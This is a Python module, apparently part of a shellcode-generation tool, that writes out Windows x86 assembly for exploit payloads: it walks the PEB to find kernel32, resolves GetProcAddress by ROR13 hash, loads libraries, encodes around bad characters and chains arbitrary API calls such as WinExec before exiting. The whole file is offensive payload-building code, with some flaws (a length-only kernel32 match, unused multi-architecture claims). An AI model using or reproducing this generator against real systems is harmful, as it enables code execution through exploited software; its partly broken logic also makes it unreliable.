"""
Windows Code Generator

Handles generation of Windows shellcode with:
- PEB walk for kernel32.dll resolution
- Dynamic API resolution via GetProcAddress
- Bad character encoding
- LoadLibraryA for external DLLs

Supports: x86, x64, ARM, ARM64
"""

from ..encoders import encode_dword, string_to_push_dwords, ror13_hash


class WindowsGenerator:
    """Generator for Windows shellcode (x86, x64, ARM, ARM64)"""

    def __init__(self, bad_chars, arch='x86'):
        """
        Initialize the generator.

        Args:
            bad_chars: Set of bad character bytes to avoid
            arch: Target architecture ('x86', 'x64', 'arm', 'arm64')
        """
        self.bad_chars = set(bad_chars)
        self.arch = arch.lower()

        # Validate architecture
        if self.arch not in ['x86', 'x64', 'arm', 'arm64']:
            raise ValueError(f"Unsupported Windows architecture: {self.arch}")

    def gen_push_encoded_dword(self, dword, reg="eax", comment=""):
        """Generate assembly to push a dword, encoding if it contains bad chars."""
        lines = []
        result = encode_dword(dword, self.bad_chars)

        if result is None:
            # No encoding needed
            lines.append(f"    push 0x{dword:08x}          ; {comment}")
        elif isinstance(result, tuple) and len(result) == 3 and result[0] == "ADD":
            # Addition encoding: val1 + val2 = target
            _, val1, val2 = result
            lines.append(f"    ; Encoded push via ADD: 0x{dword:08x} {comment}")
            lines.append(f"    mov {reg}, 0x{val1:08x}")
            lines.append(f"    add {reg}, 0x{val2:08x}")
            lines.append(f"    push {reg}")
        else:
            # Subtraction encoding: clean - offset = target
            clean, offset = result
            lines.append(f"    ; Encoded push via SUB: 0x{dword:08x} {comment}")
            lines.append(f"    mov {reg}, 0x{clean:08x}")
            lines.append(f"    sub {reg}, 0x{offset:08x}")
            lines.append(f"    push {reg}")

        return "\n".join(lines)

    def gen_push_string(self, s, label=None):
        """Generate assembly to push a null-terminated string onto the stack."""
        lines = []
        dwords = string_to_push_dwords(s)

        lines.append(f"    ; Push string: \"{s}\"")

        # Push in reverse order so the string is laid out correctly in memory
        for i, dword in enumerate(reversed(dwords)):
            if dword == 0x00000000:
                lines.append("    xor eax, eax")
                lines.append("    push eax               ; null terminator")
            else:
                lines.append(self.gen_push_encoded_dword(dword, comment=f"part of \"{s[:20]}...\""))

        lines.append("    mov ecx, esp            ; ecx -> string on stack")
        if label:
            lines.append(f"    mov {label}, ecx        ; save pointer for reuse")
        return "\n".join(lines)

    def gen_boilerplate(self):
        """Generate the reusable PEB walk + GetProcAddress resolver boilerplate."""
        return f"""; ==========================================================================
_start:
    xor eax, eax                ; zero eax
    mov eax, fs:[eax + 0x30]    ; PEB (null-free encoding)
    mov eax, [eax + 0x0C]       ; PEB->Ldr
    mov esi, [eax + 0x1C]       ; InInitializationOrderModuleList.Flink

find_kernel32:
    mov eax, [esi + 0x08]       ; InInitializationOrderModule.base
    mov edi, [esi + 0x20]       ; InInitializationOrderModule.BaseDllName.Buffer
    mov ecx, [esi + 0x1C]       ; InInitializationOrderModule.BaseDllName.Length
    ; Check if BaseDllName.Length == 24 (0x18) bytes
    ; "kernel32.dll" in Unicode = 12 chars * 2 bytes = 24 bytes
    cmp ecx, 0x18
    jne next_module
    ; Found kernel32.dll (length matches)
    mov ebx, eax                ; ebx = kernel32.dll base address
    jmp found_kernel32

next_module:
    mov esi, [esi]              ; move to next module (Flink)
    jmp find_kernel32

found_kernel32:
    ; --- Parse PE Export Table ---
    mov eax, [ebx + 0x3C]       ; e_lfanew
    add eax, ebx                ; PE header
    mov eax, [eax + 0x78]       ; Export Table RVA
    add eax, ebx                ; Export Table VA
    mov dword ptr [esp - 0x04], eax       ; save export table addr
    sub esp, 0x04
    ; Store export table pointers
    mov ecx, [eax + 0x18]       ; NumberOfNames
    mov edx, [eax + 0x20]       ; AddressOfNames RVA
    add edx, ebx                ; AddressOfNames VA
    ; --- Find GetProcAddress via ROR13 hash ---
    ; Hash of "GetProcAddress" = 0x7c0dfcaa
find_function:
    jecxz find_function_done
    dec ecx
    mov esi, [edx + ecx * 4]    ; name RVA
    add esi, ebx                ; name VA

    ; Compute ROR13 hash
    xor edi, edi
hash_loop:
    lodsb                        ; load byte from esi
    test al, al
    jz hash_done
    ror edi, 0x0D
    add edi, eax
    jmp hash_loop

hash_done:
    cmp edi, 0x7c0dfcaa         ; hash of "GetProcAddress"
    jnz find_function

    ; Found it - resolve the address
    mov eax, [esp]               ; export table
    mov edx, [eax + 0x24]       ; AddressOfNameOrdinals RVA
    add edx, ebx
    movzx ecx, word ptr [edx + ecx * 2]  ; ordinal
    mov edx, [eax + 0x1C]       ; AddressOfFunctions RVA
    add edx, ebx
    mov edi, [edx + ecx * 4]    ; function RVA
    add edi, ebx                ; edi = GetProcAddress

find_function_done:
    add esp, 0x04                ; clean up saved export table

    ; --- Resolve LoadLibraryA using GetProcAddress ---
    ; Push "LoadLibraryA" onto stack
    xor eax, eax
    push eax                     ; null terminator
{self.gen_push_encoded_dword(0x41797261, comment='"Ayra" (part of LoadLibraryA)')}
{self.gen_push_encoded_dword(0x7262694c, comment='"rbiL"')}
{self.gen_push_encoded_dword(0x64616f4c, comment='"daoL"')}
    push esp                     ; pointer to "LoadLibraryA"
    push ebx                     ; kernel32 base
    call edi                     ; GetProcAddress(kernel32, "LoadLibraryA")
    mov ebp, eax                 ; ebp = LoadLibraryA
"""

    def gen_api_call(self, api_name, dll_name, args, call_number, string_cache):
        """
        Generate assembly for resolving and calling a single API.

        Args:
            api_name: API function name (e.g., "WinExec")
            dll_name: DLL name (e.g., "kernel32.dll" or None)
            args: List of arguments (int, str, "REG:eax", "STR_PTR:value")
            call_number: Call sequence number
            string_cache: Dict of cached string pointers
        """
        lines = []
        lines.append(f"\n; --- Call #{call_number}: {api_name}({', '.join(str(a) for a in args)}) ---")

        # Load DLL if not kernel32
        if dll_name and dll_name.lower() != "kernel32.dll":
            lines.append(f"    ; LoadLibraryA(\"{dll_name}\")")
            dll_dwords = string_to_push_dwords(dll_name)
            lines.append("    xor eax, eax")
            lines.append("    push eax")
            for dw in reversed(dll_dwords):
                if dw != 0:
                    lines.append(self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"'))
            lines.append("    push esp")
            lines.append("    call ebp              ; LoadLibraryA")
            lines.append("    mov esi, eax          ; esi = DLL base")
            base_reg = "esi"
        else:
            base_reg = "ebx"

        # Resolve the API
        lines.append(f"    ; GetProcAddress({base_reg}, \"{api_name}\")")
        api_dwords = string_to_push_dwords(api_name)
        lines.append("    xor eax, eax")
        lines.append("    push eax")
        for dw in reversed(api_dwords):
            if dw != 0:
                lines.append(self.gen_push_encoded_dword(dw, comment=f'part of "{api_name}"'))
        lines.append("    push esp")
        lines.append(f"    push {base_reg}          ; DLL base")
        lines.append("    call edi              ; GetProcAddress")
        lines.append("    mov esi, eax          ; esi = function pointer")

        # Push arguments right-to-left (stdcall)
        lines.append(f"    ; Push args for {api_name} (right to left)")

        # Push args in reverse
        for arg in reversed(args):
            if isinstance(arg, int):
                if arg == 0:
                    lines.append("    xor eax, eax")
                    lines.append("    push eax               ; arg = 0")
                else:
                    lines.append(self.gen_push_encoded_dword(arg, comment=f"arg = 0x{arg:x}"))
            elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
                # Reuse cached string pointer
                string_val = arg[8:]
                if string_val in string_cache:
                    cached_reg = string_cache[string_val]
                    lines.append(f"    push {cached_reg}          ; reused string pointer")
                else:
                    # Fallback
                    lines.append(self.gen_push_string(string_val))
                    lines.append("    push ecx               ; pointer to string arg")
            elif isinstance(arg, str) and arg.startswith("REG:"):
                reg = arg.split(":")[1]
                lines.append(f"    push {reg}              ; arg from register")
            elif isinstance(arg, str):
                # String argument: push onto stack, then push pointer
                lines.append(self.gen_push_string(arg))
                lines.append("    push ecx               ; pointer to string arg")

        lines.append("    call esi              ; call " + api_name)
        return "\n".join(lines)

    def gen_exit_shellcode(self):
        """Generate clean exit via ExitProcess."""
        lines = []
        lines.append("\n; --- Clean exit via ExitProcess ---")
        lines.append("    xor eax, eax")
        lines.append("    push eax               ; exit code 0")

        # Resolve ExitProcess
        api_dwords = string_to_push_dwords("ExitProcess")
        lines.append("    ; GetProcAddress(kernel32, \"ExitProcess\")")
        lines.append("    xor eax, eax")
        lines.append("    push eax")
        for dw in reversed(api_dwords):
            if dw != 0:
                lines.append(self.gen_push_encoded_dword(dw, comment='part of "ExitProcess"'))
        lines.append("    push esp")
        lines.append("    push ebx              ; kernel32 base")
        lines.append("    call edi              ; GetProcAddress")
        lines.append("    xor ecx, ecx")
        lines.append("    push ecx              ; exit code 0")
        lines.append("    call eax              ; ExitProcess(0)")
        return "\n".join(lines)

    @staticmethod
    def consolidate_strings(calls):
        """
        Analyze all API calls and identify strings that are reused.

        Returns: (updated_calls, string_cache)
        """
        # Count string usage
        string_usage = {}
        for call in calls:
            for arg in call["args"]:
                if isinstance(arg, str) and not arg.startswith("REG:") and not arg.startswith("STR_PTR:"):
                    string_usage[arg] = string_usage.get(arg, 0) + 1

        # Identify strings used more than once
        reused_strings = {s: f"[ebp-{(i+1)*4}]" for i, (s, count) in enumerate(string_usage.items()) if count > 1}

        # Update calls to reference cached strings
        updated_calls = []
        for call in calls:
            updated_args = []
            for arg in call["args"]:
                if isinstance(arg, str) and arg in reused_strings:
                    updated_args.append(f"STR_PTR:{arg}")
                else:
                    updated_args.append(arg)
            updated_call = call.copy()
            updated_call["args"] = updated_args
            updated_calls.append(updated_call)

        return updated_calls, reused_strings

    def generate(self, config):
        """
        Generate complete Windows shellcode from a config dict.

        Args:
            config: Dict with 'bad_chars', 'calls', 'exit' keys

        Returns:
            str: Complete assembly code
        """
        calls = config.get("calls", [])
        do_exit = config.get("exit", True)

        # Consolidate reused strings
        calls, string_cache = self.consolidate_strings(calls)

        output = []
        output.append("; " + "=" * 70)
        output.append(f"; Auto-generated {self.arch.upper()} Windows Shellcode")
        output.append(f"; Architecture: {self.arch}")
        output.append(f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
        output.append("; " + "=" * 70)
        output.append("")

        # Boilerplate
        output.append(self.gen_boilerplate())

        # Push cached strings once at the beginning
        if string_cache:
            output.append("\n; --- String cache (reused strings) ---")
            for string_val, reg_name in string_cache.items():
                output.append(self.gen_push_string(string_val))
                output.append(f"    mov {reg_name}, ecx      ; cache pointer to \"{string_val[:30]}...\"")
            output.append("")

        # Payload calls
        for i, call in enumerate(calls):
            output.append(self.gen_api_call(
                api_name=call["api"],
                dll_name=call.get("dll", "kernel32.dll"),
                args=call["args"],
                call_number=i + 1,
                string_cache=string_cache
            ))
            output.append("")

        # Exit
        if do_exit:
            output.append(self.gen_exit_shellcode())

        full_asm = "\n".join(output)

        # Print summary
        print("=" * 72)
        print("SHELLCODE GENERATOR OUTPUT")
        print("=" * 72)
        print(f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
        print(f"API calls:      {len(calls)}")
        for i, call in enumerate(calls):
            print(f"  [{i+1}] {call['api']}({', '.join(str(a)[:50] for a in call['args'])})")
        print(f"Clean exit:     {do_exit}")
        if string_cache:
            print(f"Cached strings: {len(string_cache)}")
        print("=" * 72)

        # Print hashes for reference
        print("\nROR13 Hashes (for manual verification):")
        print(f"  GetProcAddress : 0x{ror13_hash('GetProcAddress'):08x}")
        print(f"  LoadLibraryA   : 0x{ror13_hash('LoadLibraryA'):08x}")
        for call in calls:
            print(f"  {call['api']:17s}: 0x{ror13_hash(call['api']):08x}")
        if do_exit:
            print(f"  ExitProcess    : 0x{ror13_hash('ExitProcess'):08x}")

        print("\n")
        return full_asm